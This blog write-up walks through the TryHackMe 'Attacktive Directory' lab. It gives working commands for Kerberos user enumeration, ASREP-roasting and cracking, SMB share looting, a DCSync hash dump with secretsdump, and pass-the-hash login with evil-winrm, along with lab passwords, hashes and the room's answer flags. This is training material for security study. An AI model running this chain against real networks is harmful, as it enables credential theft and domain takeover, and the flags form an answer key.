---
title: "Challenges: Attacktive Directory (TryHackMe)"
datePublished: Wed Jun 25 2025 14:26:02 GMT+0000 (Coordinated Universal Time)
cuid: cmcc1rnum000p02la5ofqf18k
slug: challenges-attacktive-directory-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1750857423649/44ffecee-9604-45a3-b3bc-031c1dd53cee.png
tags: linux, windows, active-directory, tryhackme, write-up, privilege-escalation, attacktive

---

Active Directory is the backbone of identity and access management in many enterprise environments. This room — *Attacktive Directory* — offers a hands-on opportunity to explore core concepts around enumeration, exploitation, and post-exploitation in an AD network. We begin by setting up essential tools like Impacket and BloodHound, then dive into realistic attack paths through Kerberos enumeration, ASREPRoasting, SMB share analysis, and domain privilege escalation. Each step emphasizes practical enumeration, misconfiguration exploitation, and understanding how attackers can go from a single credential to domain-wide control.

Whether you're new to AD pentesting or reinforcing the fundamentals, this room presents a guided journey through an attacker’s mindset — from recon to owning the domain admin.  
  
Resources that were helpful in this room: Medium Article: [1](https://medium.com/@kawsaruddin238/attacktive-directory-tryhackme-aefcd728ce72) & [2](https://olivierkonate.medium.com/attacktive-directory-tryhackme-writeup-d74dfe07ae), ChatGPT for research, and Notion for note-taking.

## Intro: Setup

**Installing Impacket:**

Whether you're on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install  correctly. Here's some instructions that may help you install it correctly!

**Note: All of the tools mentioned in this task are installed on the AttackBox already. These steps are only required if you are setting up on your own VM. Impacket may also need you to use a python version &gt;=3.7. In the AttackBox you can do this by running your command with** `python3.9 <your command>`.

First, you will need to clone the Impacket Github repo onto your box. The following command will clone Impacket into /opt/impacket:

`git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket`

After the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. A commonly skipped file during the installation is setup.py, this actually installs Impacket onto your system so you can use it and not have to worry about any dependencies.

To install the Python requirements for Impacket:

`pip3 install -r /opt/impacket/requirements.txt`

Once the requirements have finished installing, we can then run the python setup install script:

`cd /opt/impacket/ && python3 ./setup.py install`

After that, Impacket should be correctly installed now and it should be ready to use!

If you are still having issues, you can try the following script and see if this works:

<table><tbody><tr><td colspan="1" rowspan="1"><p>sudo git clone <a target="_blank" rel="noopener noreferrer nofollow" class="anchor-3Z-8Bb anchorUnderlineOnHover-2ESHQB" href="https://github.com/SecureAuthCorp/impacket.git" style="pointer-events: none">https://github.com/SecureAuthCorp/impacket.git</a> /opt/impacket sudo pip3 install -r /opt/impacket/requirements.txt cd /opt/impacket/ sudo pip3 install . sudo python3 setup.py install</p></td></tr></tbody></table>

Credit for proper Impacket install instructions goes to Dragonar#0923 in the [THM Discord](https://discord.gg/tryhackme) &lt;3

**Installing Bloodhound and Neo4j**

Bloodhound is another tool that we'll be utilizing while attacking Attacktive Directory. We'll cover specifcs of the tool later, but for now, we need to install two packages with Apt, those being bloodhound and neo4j. You can install it with the following command:

`apt install bloodhound neo4j`

 Now that it's done, you're ready to go!

**Troubleshooting**

If you are having issues installing Bloodhound and Neo4j, try issuing the following command:

`apt update && apt upgrade`

## Enumeration: Welcome to Attacktive Directory

**Welcome to Attacktive Directory**

Welcome Dear User!

Thank you for doing my first room. I originally created this room for my final project in my Cyber Security degree program back in 2019. Since then, I've gone on to make several other rooms, even a Network for THM. In May 2021, I made the decision to renovate this room and make it more guided and less challenge based so there are more learning opportunities for others. I hope you enjoy it.

Love,

[Spooks](https://twitter.com/NekoS3c)

**Enumeration**

Basic enumeration starts out with an **nmap scan**. Nmap is a relatively complex utility that has been refined over the years to detect what ports are open on a device, what services are running, and even detect what operating system is running. It's important to note that not all services may be deteted correctly and not enumerated to it's fullest potential. Despite nmap being an overly complex utility, it cannot enumerate everything. Therefore after an initial nmap scan we'll be using other utilities to help us enumerate the services running on the device.

For more information on nmap, check out the [nmap room](https://tryhackme.com/room/furthernmap).

**Notes*:*** Flags for each user account are available for submission. You can retrieve the flags for user accounts via RDP (Note: the login format is spookysec.local\\User at the Window's login prompt) and Administrator via Evil-WinRM.

### Answer the questions below

1. What tool will allow us to enumerate port 139/445? `enum4linux`
    
2. What is the NetBIOS-Domain Name of the machine? `THM-AD`  
      
    `enum4linux <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860454268/89c9b387-7225-47fa-bd75-ace5326eea3d.png align="center")
    
3. What invalid TLD do people commonly use for their Active Directory Domain? `.local`  
      
    hint: Spoiler: The full AD domain is spookysec.local
    

## Enumeration: Enumerating Users via Kerberos

**Introduction:**

A whole host of other services are running, including **Kerberos**. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute/releases) (by Ronnie Flathers [@ropnop](https://twitter.com/ropnop)) to brute force discovery of users, passwords and even password spray!

**Note:** Several users have informed me that the latest version of Kerbrute does not contain the UserEnum flag in Kerbrute, if that is the case with the version you have selected, try a older version!

**Enumeration:**

For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of enumeration of users and password hash cracking. It is **NOT** recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.

### Answer the questions below

1. What command within Kerbrute will allow us to enumerate valid usernames? `userenum`
    
2. What notable account is discovered? (These should jump out at you) `svc-admin`  
      
    `echo -e "administrator\\nkrbtgt\\nsvc-admin\\nbackup\\njames" > users.txt`  
    
    `kerbrute userenum -d spookysec.local users.txt --dc <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860596650/21c2e02e-9976-4594-8c4f-22ad774d663c.png align="center")
    
3. What is the other notable account is discovered? (These should jump out at you) `backup`  
    

## Exploitation: Abusing Kerberos

**Introduction**

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

**Retrieving Kerberos Tickets**

[Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

**Remember:  Impacket may also need you to use a python version &gt;=3.7. In the AttackBox you can do this by running your command with** `python3.9 /opt/impacket/examples/GetNPUsers.py`**.**

### Answer the questions below

1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password? `svc-admin`  
      
    `nano hash.txt`  
    
    `$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9631f8904f518b7e1d93e92781f38660$4b3384dc5844e6fda59afd2d207829767c3bcd7327341a86b2b029327bb26ef325ffe5bcc5129bd9b08d50bf973c6b2df8b03083d48145b2d5cb116f248e8c961c3f8b2d7bce07ec82086571d5fe07b48f1688fb91ed0d5ace88a9ee4e0b8b7f1d538655b585a193bd7b624fae1ac71a6f777ad98a4d392c58edfb2f3553bb05bccece680d86f597b1f5f7039fe318b25651d9d82b184cbe14e311e7c15b293f30dc2e6b3495dd2937627dcd2b5cd31cd822d6172b8b979e95ae7918d0dd7fd6288e0b01e5046a2575260f88f84206ac006f5e7eb66b3d486a35a86b3e8a1e20c81e8e28c6f0b18b145b4559bddaef09d863`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860801219/80895bb8-bba6-4dce-967a-2481f90d4765.png align="center")
    
2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name) `Kerberos 5 AS-REP etype 23`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860773104/c2b2b10b-23fc-444f-9fe9-b2890d4db98d.png align="center")
    
3. What mode is the hash? `18200`
    
4. Now crack the hash with the modified password list provided, what is the user accounts password? `management2005`  
      
    `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`  
    
    `john —show hash.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860739910/3d1d87b9-4a12-42f5-8e11-f573c491dc9b.png align="center")
    

## Enumeration: Back to the Basics

**Enumeration:**

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

### Answer the questions below

1. What utility can we use to map remote SMB shares? `smbclient`
    
2. Which option will list shares? `-L`  
      
    `man smbclient`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860175449/0c1e0331-eea0-405b-b47e-09d2d49c0cec.png align="center")
    
3. How many remote shares is the server listing? `6`  
      
    `smbclient -L //<IP_Address>/ -U svc_admin`
    
    password: management2005
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860221872/60459d01-7a9e-4c70-9bdd-b3da4c333aa7.png align="center")
    
4. There is one particular share that we have access to that contains a text file. Which share is it? `backup`  
      
    `smbclient //<IP_Address>/backup -U svc-admin`  
    Password for \[WORKGROUP\\svc-admin\]:  
      
    `get backup_credentials.txt`  
      
    `exit`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860260579/a803e974-085c-4cbf-8ad4-625d038bc43e.png align="center")
    
5. What is the content of the file? `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`  
      
    `cat backup_credentials.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750860356039/1f834287-ba5c-4fba-a607-af071c7a7f4c.png align="center")
    
6. Decoding the contents of the file, what is the full contents? `backup@spookysec.local:backup2517860`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750859859727/eabccca8-64f5-48fc-8ddd-a3779d7121f0.png align="center")
    

## Domain Privilege Escalation: Elevating Privileges within the Domain

**Let's Sync Up!**

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

![](https://blog.spookysec.net/img/dcsync.png align="left")

Knowing this, we can use another tool within Impacket called "[secretsdump.py](http://secretsdump.py)". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

### Answer the questions below

1. What method allowed us to dump NTDS.DIT? `DRSUAPI`  
      
    `python3.9 /opt/impacket/examples/secretsdump.py spookysec.local/svc-admin:'management2005'@10.10.168.55`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750859769306/06525436-18a5-46c6-9081-af872f7938d0.png align="center")
    
2. What is the Administrators NTLM hash? `0e0363213e37b94221497260b0bcb4fc`  
      
    `apt install python3-impacket`  
    
    `impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.10.168.55`  
      
    We can save the output to a file just in case we need it in the next steps:  
      
    `impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.10.168.55 > ntlmhash.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750859634568/29147f69-a35b-4943-b9b9-9c18ad8318f8.png align="center")
    
3. What method of attack could allow us to authenticate as the user without the password? `Pass The Hash`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750859606258/86805400-ede3-4721-b898-4be0dadd8532.png align="center")
    
4. Using a tool called Evil-WinRM what option will allow us to use a hash? `-H`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750859583295/4f65658d-a7b7-40ef-9dd8-31f40bda0c48.png align="center")
    
      
    

## Flag Submission: Flag Submission Panel

Submit the flags for each user account. They can be located on each user's desktop.

If you enjoyed this box, you may also enjoy my [blog post!](https://blog.spookysec.net/kerberos-abuse/)

### Answer the questions below

1. Administrator `TryHackMe{4ctiveD1rectoryM4st3r}`  
      
    First, we have to install [Evil-WinRM](https://www.kali.org/tools/evil-winrm/) using `sudo apt install evil-winrm` or `gem install evil-winrm`. Then we’ll use evil-winrm to get our flags using the hash.  
      
    `evil-winrm -i <IP_Address> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`  
      
    With privilege escalation we can now access the flags of all the three users we’re targeting
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750859276422/7829b2de-cc66-4416-aa20-394792a60403.png align="center")
    
2. [svc-admin `TryHackMe{K`](https://www.kali.org/tools/evil-winrm/)`3rb3r0s_Pr3_4uth}`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750859250252/f221c3de-ca34-4244-8067-46d038cb6467.png align="center")
    
3. backup `TryHackMe{B4ckM3UpSc0tty!}`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750858379740/82dd4261-79e7-4131-bea8-61275e6cd02f.png align="center")
    
    *Attacktive Directory* brings together enumeration techniques, Kerberos attacks like ASREPRoasting, and domain privilege escalation using synced backup accounts — all within a realistic AD lab. By the end, we leveraged hashes, performed pass-the-hash attacks, and used Evil-WinRM to obtain flags from multiple user accounts, including the coveted Administrator.  
    
    Beyond just answering CTF-style questions, this room reinforces key Active Directory exploitation principles: the importance of user enumeration, Kerberos misconfigurations, the dangers of exposed SMB shares, and the power of synced privileged accounts.  
    
    For anyone exploring offensive security or preparing for real-world red team assessments, this room offers both a strong technical foundation and a practical skillset.